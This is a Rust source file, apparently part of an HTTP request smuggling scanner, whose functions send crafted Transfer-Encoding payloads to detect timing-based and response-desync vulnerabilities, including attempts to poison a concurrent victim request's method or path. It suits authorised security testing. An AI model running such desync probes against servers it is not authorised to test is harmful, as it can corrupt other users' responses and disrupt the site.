use crate::{
    structs::{Config, AttackType, AttackKind},
    utils::{generate_requests, payloads, found},
    raw_requests::{make_connection, raw_request},
};
use std::{thread, time, io, io::Write};

pub fn timing(
    config: &Config,
    attack_types: &Vec<AttackType>
) {
    let request_template = generate_requests(AttackType::ClTe, config);

    for attack_type in attack_types.iter() {
        writeln!(io::stdout(), "Trying {}..", attack_type.to_string()).ok();
        let bad_request_template = generate_requests(*attack_type, config);
        for payload in payloads(config) {
            //generate a request that will cause time delay in case of presence of the vulnerability
            let bad_request = bad_request_template.replace("Transfer-Encoding: chunked", &payload);
            for i in 0..config.verify+1 {

                let (stream, bad_response) = match raw_request(config, make_connection(&config).unwrap(), &bad_request) {
                    Ok(val) => val,
                    Err(err) => {
                        writeln!(io::stderr(), "{}", err).ok();
                        break
                    }
                };
                if let Some(mut stream) = stream { stream.shutdown().ok(); }

                //move to the next payload in case no time delay is caused
                if bad_response.time < 5000 {
                    break;
                }

                if i == 0 {
                    writeln!(io::stdout(), "Time delay observed ({}ms)", bad_response.time).ok();
                } else if i == config.verify {
                    writeln!(io::stdout(), "Time delay confirmed ({}ms)", bad_response.time).ok();
                }
                thread::sleep(time::Duration::from_secs(5));

                //generate a request with correct sizes that will not cause delay if the vulnerability is present
                let request = request_template.replace("Transfer-Encoding: chunked", &payload);
                let (stream, correct_response) = match raw_request(config, make_connection(&config).unwrap(), &request) {
                    Ok(val) => val,
                    Err(err) => {
                        writeln!(io::stderr(), "{}", err).ok();
                        break
                    }
                };
                if let Some(mut stream) = stream { stream.shutdown().ok(); }

                if correct_response.time * 2 > bad_response.time { //filter some false positives
                    writeln!(io::stdout(), "Time delay rejected. The correct response caused delay ({}ms)", correct_response.time).ok();
                    return
                }

                if i == config.verify {
                    found(*attack_type, &bad_request, &request, &bad_response, &correct_response);
                    return
                }
            }
        }
    }
}

pub fn differential_responses(
    config: &Config,
    attack_types: &Vec<AttackType>
) {
    //create different requests
    let mut usual_request = config.custom_print("GET", &config.path);
    usual_request.push_str("\r\n");

    let mut gmethod_request = config.custom_print("GPOST", &config.path);
    gmethod_request.push_str("\r\n");

    let mut notfound_request = config.custom_print("GET", "/so404mething");
    notfound_request.push_str("\r\n");

    //send these requests to check whether the clear difference (comparing to usual response) is present
    let usual_response =
        match raw_request(config, make_connection(&config).unwrap(), &usual_request) { //close connection in case everything is ok
            Ok(val) => if let Some(mut stream) = val.0 {
                stream.shutdown().ok();
                Some(val.1)
            } else {
                Some(val.1)
            },
            Err(_) => {
                writeln!(io::stderr(), "Unable to get response for {}", config.host).ok();
                return
            },
    };

    let gmethod_response =
        match raw_request(config, make_connection(&config).unwrap(), &gmethod_request) { //close connection in case everything is ok
            Ok(val) => if let Some(mut stream) = val.0 {
                stream.shutdown().ok();
                Some(val.1)
            } else {
                Some(val.1)
            },
            Err(_) => {
                writeln!(io::stderr(), "Unable to get response for {}(incorrect method).\nSome checks may be skipped", config.host).ok();
                None
            },
    };

    let notfound_response =
        match raw_request(config, make_connection(&config).unwrap(), &notfound_request) {
            Ok(val) => if let Some(mut stream) = val.0 {
                stream.shutdown().ok();
                Some(val.1)
            } else {
                Some(val.1)
            },
            Err(_) => {
                writeln!(io::stderr(), "Unable to get response for {}(not found path).\nSome checks may be skipped", config.host).ok();
                None
            },
    };

    //TODO maybe check path and method together
    if (usual_response.is_some() && gmethod_response.is_some())
    && (usual_response.as_ref().unwrap().code != gmethod_response.as_ref().unwrap().code || gmethod_response.as_ref().unwrap().body.contains("GPOST")) {
        for attack_type in attack_types.clone() {

            if attack_type.kind() != AttackKind::Method {
                continue
            }
            writeln!(io::stdout(), "Trying {}..", attack_type.to_string()).ok();

            let attacker_request_template = generate_requests(attack_type, config);

            for payload in payloads(config) {
                let attacker_request = attacker_request_template.replace("Transfer-Encoding: chunked", payload);

                for _ in 0..config.verify {
                    //make a request that may cause response desync
                    let (stream, _attacker_response) =
                        match raw_request(config, make_connection(&config).unwrap(), &attacker_request) {
                            Ok(val) => val,
                            Err(err) => {
                                writeln!(io::stderr(), "{}", err).ok();
                                continue
                            }
                    };
                    if let Some(mut stream) = stream { stream.shutdown().ok(); }

                    let mut threads = vec![];
                    //try to catch that desync
                    for _ in 0..5 {
                        //TODO optimize memory allocations
                        let config = config.clone();
                        let usual_request = usual_request.clone();
                        let usual_response = usual_response.clone();
                        let gmethod_response = gmethod_response.clone();
                        let attacker_request = attacker_request.clone();

                        threads.push(thread::spawn(move || {
                            let (stream, victim_response) =
                                match raw_request(&config, make_connection(&config).unwrap(), &usual_request) {
                                    Ok(val) => val,
                                    Err(err) => {
                                        writeln!(io::stderr(), "{}", err).ok();
                                        return false
                                    }
                            };
                            if let Some(mut stream) = stream { stream.shutdown().ok(); }

                            if victim_response.body.contains("GGET") || victim_response.code == gmethod_response.as_ref().unwrap().code {
                                found(
                                    attack_type,
                                    &attacker_request,
                                    &usual_request,
                                    &victim_response,
                                    &usual_response.as_ref().unwrap()
                                );
                                return true;
                            }
                            false
                        }));
                    }
                    for thread in threads {
                        match thread.join() {
                            Ok(val) => if val { return },
                            Err(_) => (),
                        };
                    }
                }
            }
        }

    }

    if notfound_response.is_some()
    && (usual_response.as_ref().unwrap().code != notfound_response.as_ref().unwrap().code || notfound_response.as_ref().unwrap().body.contains("so404mething")) {

        let usual_response = usual_response.unwrap();
        let notfound_response = notfound_response.unwrap();


        for attack_type in attack_types.clone() {

            if attack_type.kind() != AttackKind::Path {
                continue
            }
            writeln!(io::stdout(), "Trying {}..", attack_type.to_string()).ok();

            let attacker_request_template = generate_requests(attack_type, config);

            for payload in payloads(config) {
                let attacker_request = attacker_request_template.replace("Transfer-Encoding: chunked", payload);

                let (stream, _attacker_response) =
                    match raw_request(config, make_connection(&config).unwrap(), &attacker_request) {
                            Ok(val) => val,
                            Err(err) => {
                                writeln!(io::stderr(), "{}", err).ok();
                                continue
                            }
                    };
                if let Some(mut stream) = stream { stream.shutdown().ok(); }
                let mut threads = vec![];

                for _ in 0..5 {
                    //TODO optimize memory allocations
                    let config = config.clone();
                    let usual_request = usual_request.clone();
                    let usual_response = usual_response.clone();
                    let notfound_response = notfound_response.clone();
                    let attacker_request = attacker_request.clone();

                    threads.push(thread::spawn(move || {//maybe replace with futures
                        let (stream, victim_response) =
                            match raw_request(&config, make_connection(&config).unwrap(), &usual_request) {
                                Ok(val) => val,
                                Err(err) => {
                                    writeln!(io::stderr(), "{}", err).ok();
                                    return false
                                }
                        };
                        if let Some(mut stream) = stream { stream.shutdown().ok(); }

                        if victim_response.body.contains("so404mething") || victim_response.code == notfound_response.code {
                            found(
                                attack_type,
                                &attacker_request,
                                &usual_request,
                                &victim_response,
                                &usual_response
                            );
                            return true
                        }
                        false
                    }));
                }

                for thread in threads {
                    match thread.join() {
                        Ok(val) => if val { return },
                        Err(_) => (),
                    };
                }
            }
        }
    }
}


pub fn send_request(config: &Config, request: &str) {
    let request = request.replace("\r", "").replace("\n", "").replace("\\r", "\r").replace("\\n", "\n").replace("\\t", "\t");
    println!("{}", &request);
    let (_, response) = raw_request(config, make_connection(&config).unwrap(), &request).unwrap();
    println!("Code: {}", response.code);
    println!("Time: {}", response.time);
}